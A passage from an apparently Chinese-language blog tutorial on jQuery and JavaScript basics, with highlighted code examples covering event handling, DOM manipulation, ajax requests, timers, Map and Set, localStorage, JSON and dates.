class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> div = $(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> $a = $(<span class="string">&#x27;div a&#x27;</span>);</span><br><span class="line">div.<span class="title function_">on</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;click&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">$a.<span class="title function_">on</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">    e.<span class="title function_">stopPropagation</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>阻止当前事件，放行向上传递：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a.<span class="title function_">on</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">    e.<span class="title function_">preventDefault</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>阻止当前事件并且关闭向上传递：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a.<span class="title function_">on</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">    e.<span class="title function_">preventDefault</span>();</span><br><span class="line">    e.<span class="title function_">stopPropagation</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a.<span class="title function_">on</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="元素隐藏与展示"><a href="#元素隐藏与展示" class="headerlink" title="元素隐藏与展示"></a>元素隐藏与展示</h4><p>向左上角缩放</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> div = $(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> btn_hide = $(<span class="string">&#x27;#hide-btn&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> btn_show = $(<span class="string">&#x27;#show-btn&#x27;</span>);</span><br><span class="line"></span><br><span class="line">btn_hide.<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    div.<span class="title function_">hide</span>(<span class="number">1500</span>);     <span class="comment">// 1500ms</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">btn_show.<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    div.<span class="title function_">show</span>(<span class="number">1500</span>);     </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>此类特效很多</p><h4 id="元素添加与删除"><a href="#元素添加与删除" class="headerlink" title="元素添加与删除"></a>元素添加与删除</h4><p>添加的元素可以添加CSS样式</p><p>尾插</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">div.<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> $a = $(</span><br><span class="line">    <span class="string">`&lt;a class=&quot;myBlog&quot; href=&quot;https://www.dqywy.top&quot; target=&quot;blank&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;span&gt;小窝&lt;/span&gt;</span></span><br><span class="line"><span class="string">    &lt;/a&gt;`</span>);</span><br><span class="line">    div.<span class="title function_">append</span>($a);     <span class="comment">// 添加元素</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">div.<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    div.<span class="title function_">append</span>($(</span><br><span class="line">    <span class="string">`&lt;a class=&quot;myBlog&quot; href=&quot;https://www.dqywy.top&quot; target=&quot;blank&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;span&gt;小窝&lt;/span&gt;</span></span><br><span class="line"><span class="string">    &lt;/a&gt;`</span>));     </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>头插</p><p><code>div.pretend()</code></p><p>删除当前元素</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> $a = $(</span><br><span class="line">    <span class="string">`&lt;a href=&quot;https://www.dqywy.top&quot; target=&quot;blank&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;span&gt;小窝&lt;/span&gt;</span></span><br><span class="line"><span class="string">    &lt;/a&gt;`</span>);</span><br><span class="line"></span><br><span class="line">div.<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    div.<span class="title function_">append</span>($a);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">div.<span class="title function_">dblclick</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    $a.<span class="title function_">remove</span>();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>删除当前元素的所有子树</p><p><code>div.empty()</code></p><h4 id="通过类间接操作CSS"><a href="#通过类间接操作CSS" class="headerlink" title="通过类间接操作CSS"></a>通过类间接操作CSS</h4><p>添加类</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">div.<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    div.<span class="title function_">addClass</span>(<span class="string">&#x27;my-div&#x27;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>删除类</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">div.<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    div.<span class="title function_">removeClass</span>(<span class="string">&#x27;my-div&#x27;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>判断类是否存在</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">div.<span class="title function_">hasClass</span>(<span class="string">&#x27;my-div&#x27;</span>);</span><br></pre></td></tr></table></figure><h4 id="直接操作CSS"><a href="#直接操作CSS" class="headerlink" title="直接操作CSS"></a>直接操作CSS</h4><p>查看属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">div.<span class="title function_">css</span>(<span class="string">&#x27;background-color&#x27;</span>);</span><br></pre></td></tr></table></figure><p>修改css属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">div.<span class="title function_">css</span>(<span class="string">&#x27;background-color&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">div.<span class="title function_">css</span>(&#123;</span><br><span class="line">    <span class="attr">width</span>: <span class="string">&#x27;200px&#x27;</span>,</span><br><span class="line">    <span class="attr">height</span>: <span class="string">&#x27;200px&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;background-color&#x27;</span>: <span class="string">&#x27;orange&#x27;</span>    <span class="comment">// 带特殊符号要加引号</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="标签属性"><a href="#标签属性" class="headerlink" title="标签属性"></a>标签属性</h4><p>获取</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">div.<span class="title function_">attr</span>(<span class="string">&#x27;id&#x27;</span>);</span><br></pre></td></tr></table></figure><p>设置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">div.<span class="title function_">attr</span>(<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;my-div&#x27;</span>);</span><br></pre></td></tr></table></figure><h4 id="标签内容"><a href="#标签内容" class="headerlink" title="标签内容"></a>标签内容</h4><p>获取文本</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(div.<span class="title function_">text</span>());</span><br></pre></td></tr></table></figure><p>修改文本</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">div.<span class="title function_">text</span>(<span class="string">&#x27;好稀饭w悦呀~&#x27;</span>);</span><br></pre></td></tr></table></figure><p>获取html内容</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">div.<span class="title function_">html</span>();</span><br></pre></td></tr></table></figure><p>获取输入框的内容</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">div.<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> input = $(<span class="string">&#x27;input&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(input.<span class="title function_">val</span>());</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>修改输入框的内容</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">div.<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> input = $(<span class="string">&#x27;input&#x27;</span>);</span><br><span class="line">    input.<span class="title function_">val</span>(<span class="string">&#x27;w悦&#x27;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="查找标签"><a href="#查找标签" class="headerlink" title="查找标签"></a>查找标签</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查找父元素</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(div2.<span class="title function_">parent</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 父元素且为div</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(div2.<span class="title function_">parent</span>(<span class="string">&#x27;div&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查找所有祖先元素</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(div3.<span class="title function_">parents</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查找所有是div的祖先元素</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(div3.<span class="title function_">parents</span>(<span class="string">&#x27;div&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查找子元素</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(div1.<span class="title function_">children</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查找是div的子元素</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(div1.<span class="title function_">children</span>(<span class="string">&#x27;div&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查找所有是div的后代元素，find必须加条件</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(div1.<span class="title function_">find</span>(<span class="string">&#x27;div&#x27;</span>));</span><br></pre></td></tr></table></figure><h4 id="ajax"><a href="#ajax" class="headerlink" title="ajax"></a>ajax</h4><p>GET方法</p><p>不刷新页面从服务器端获取某些数据(<code>json</code>)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">    <span class="attr">url</span>: url,   <span class="comment">// 后端链接</span></span><br><span class="line">    <span class="attr">type</span>: <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">    <span class="attr">data</span>: &#123;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">    <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">resp</span>) &#123;      <span class="comment">// 操作成功成功调用回调函数，resp存储后端返回的信息</span></span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>POST方法</p><p>提交表单</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">    <span class="attr">url</span>: url,</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    <span class="attr">data</span>: &#123;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">    <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">resp</span>) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="辅助函数"><a href="#辅助函数" class="headerlink" title="辅助函数"></a><a href="https://www.acwing.com/file_system/file/content/whole/index/content/5390129/">辅助函数</a></h3><h4 id="延时函数"><a href="#延时函数" class="headerlink" title="延时函数"></a>延时函数</h4><p><code>setTimeout(func, time)</code>：</p><ul><li><code>time</code>毫秒之后执行</li><li>执行周期=函数调用时间+time，不均匀</li></ul><p><code>clearTimeout(func_id)</code></p><h4 id="周期执行"><a href="#周期执行" class="headerlink" title="周期执行"></a>周期执行</h4><p><code>setInterval(func, time)</code>：time代表将当前函数压入栈中的时间间隔，栈中存在其他函数，执行时间无法确定</p><p><code>clearInterval(func_id)</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> $div = $(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> func_id;</span><br><span class="line"></span><br><span class="line">$div.<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (func_id) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    func_id = <span class="built_in">setInterval</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;wy&#x27;</span>);</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">$div.<span class="title function_">dblclick</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">clearInterval</span>(func_id);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="浏览器刷新页面之前执行"><a href="#浏览器刷新页面之前执行" class="headerlink" title="浏览器刷新页面之前执行"></a>浏览器刷新页面之前执行</h4><p><code>requestAnimationFrame(func)</code>：</p><ul><li>时间间隔均匀</li><li>切换到后台不再执行</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">step</span>(<span class="params"></span>) &#123;</span><br><span class="line">    $(<span class="string">&#x27;div&#x27;</span>).<span class="title function_">width</span>($(<span class="string">&#x27;div&#x27;</span>).<span class="title function_">width</span>() + <span class="number">1</span>);</span><br><span class="line">    <span class="title function_">requestAnimationFrame</span>(step);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">requestAnimationFrame</span>(step);</span><br></pre></td></tr></table></figure><p>设置时间限制</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">step</span>(<span class="params">timestamp</span>) &#123;</span><br><span class="line">    $(<span class="string">&#x27;div&#x27;</span>).<span class="title function_">width</span>($(<span class="string">&#x27;div&#x27;</span>).<span class="title function_">width</span>() + <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// timestamp代表执行时刻（ms）</span></span><br><span class="line">    <span class="keyword">if</span> (timestamp / <span class="number">1000</span> &lt;= <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="title function_">requestAnimationFrame</span>(step);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">requestAnimationFrame</span>(step);</span><br></pre></td></tr></table></figure><p>设置结束条件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> func_id;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">step</span>(<span class="params">timestamp</span>) &#123;</span><br><span class="line">    $(<span class="string">&#x27;div&#x27;</span>).<span class="title function_">width</span>($(<span class="string">&#x27;div&#x27;</span>).<span class="title function_">width</span>() + <span class="number">1</span>);</span><br><span class="line">    func_id = <span class="title function_">requestAnimationFrame</span>(step);</span><br><span class="line">&#125;;</span><br><span class="line">func_id = <span class="title function_">requestAnimationFrame</span>(step);</span><br><span class="line"></span><br><span class="line">$(<span class="string">&#x27;div&#x27;</span>).<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">cancelAnimationFrame</span>(func_id);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$(<span class="string">&#x27;div&#x27;</span>).<span class="title function_">dblclick</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    func_id = <span class="title function_">requestAnimationFrame</span>(step);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="Map与Set"><a href="#Map与Set" class="headerlink" title="Map与Set"></a><a href="https://www.acwing.com/file_system/file/content/whole/index/content/5390133/">Map与Set</a></h3><h4 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line">map.<span class="title function_">set</span>(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;w悦&#x27;</span>);</span><br><span class="line">map.<span class="title function_">set</span>(<span class="string">&#x27;age&#x27;</span>, <span class="number">18</span>);</span><br><span class="line">map.<span class="title function_">set</span>(<span class="string">&#x27;test&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="title function_">get</span>(<span class="string">&#x27;name&#x27;</span>));   <span class="comment">// 获取值</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="title function_">has</span>(<span class="string">&#x27;age&#x27;</span>));    <span class="comment">// 是否存在</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="property">size</span>);  <span class="comment">// 键值对个数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历1</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> [key, value] <span class="keyword">of</span> map) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;key&#125;</span>: <span class="subst">$&#123;value&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历2</span></span><br><span class="line">map.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">value, key</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;key&#125;</span>: <span class="subst">$&#123;value&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">map.<span class="title function_">delete</span>(<span class="string">&#x27;test&#x27;</span>);     <span class="comment">// 删除</span></span><br><span class="line">map.<span class="title function_">clear</span>();    <span class="comment">// 清空</span></span><br></pre></td></tr></table></figure><h4 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> set = <span class="keyword">new</span> <span class="title class_">Set</span>();</span><br><span class="line">set.<span class="title function_">add</span>(<span class="string">&#x27;wy&#x27;</span>);</span><br><span class="line">set.<span class="title function_">add</span>(<span class="number">18</span>);</span><br><span class="line">set.<span class="title function_">add</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;w悦&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(set.<span class="title function_">has</span>(<span class="number">18</span>));</span><br><span class="line">set.<span class="title function_">delete</span>(<span class="number">18</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(set.<span class="property">size</span>);</span><br><span class="line">set.<span class="title function_">clear</span>();</span><br></pre></td></tr></table></figure><h3 id="localStorage"><a href="#localStorage" class="headerlink" title="localStorage"></a>localStorage</h3><p>在用户浏览器存储键值对(关闭浏览器、关机、清除缓存仍然存在)</p><p>用户查看：<code>Application</code> -&gt; <code>Storage</code> -&gt; <code>Local storage</code></p><ul><li><code>setItem(key, value)</code>：插入</li><li><code>getItem(key)</code>：查找</li><li><code>removeItem(key)</code>：删除</li><li><code>clear()</code>：清空</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;w悦&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;name&#x27;</span>));</span><br><span class="line"><span class="variable language_">localStorage</span>.<span class="title function_">removeItem</span>(<span class="string">&#x27;name&#x27;</span>);</span><br><span class="line"><span class="variable language_">localStorage</span>.<span class="title function_">clear</span>();</span><br></pre></td></tr></table></figure><h3 id="数据存储"><a href="#数据存储" class="headerlink" title="数据存储"></a>数据存储</h3><p>服务端：</p><ul><li>云盘</li><li>mysql</li><li>redis</li></ul><p>客户端：</p><ul><li>内存(js变量)</li><li>localStorage</li></ul><h3 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h3><p><strong>字符串/字节</strong>与<strong>对象</strong>双向转换</p><ul><li>JSON.parse()：将字符串解析成对象</li><li>JSON.stringify()：将对象转化为字符串</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;wy&#x27;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">18</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> str = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj);</span><br><span class="line"><span class="keyword">let</span> new_obj = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(str);</span><br></pre></td></tr></table></figure><h3 id="日期"><a href="#日期" class="headerlink" title="日期"></a>日期</h3><p>当前时刻（从<code>1970.1.1 00:00:00</code>经过的<strong>ms</strong>）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Date</span>.<span class="title function_">now</span>());</span><br></pre></td></tr></table></figure><p>任意时刻：北京时间2022年4月15日 15:30:00</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Date</span>.<span class="title function_">parse</span>(<span class="string">&quot;2022-04-15T15:30:00.000+08:00&quot;</span>));</span><br></pre></td></tr></table></figure><p><code>API</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> start_time = <span class="keyword">new</span> <span class="title class_">Date</span>();    <span class="comment">// 无参表示当前时间</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算两个日期的差值</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(start_time - <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&quot;2022-04-15T15:30:00.000+08:00&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 星期</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(start_time.<span class="title function_">getDay</span>());   </span><br><span class="line"></span><br><span class="line"><span class="comment">// 日</span></span><br><span class="line"><span class="variable 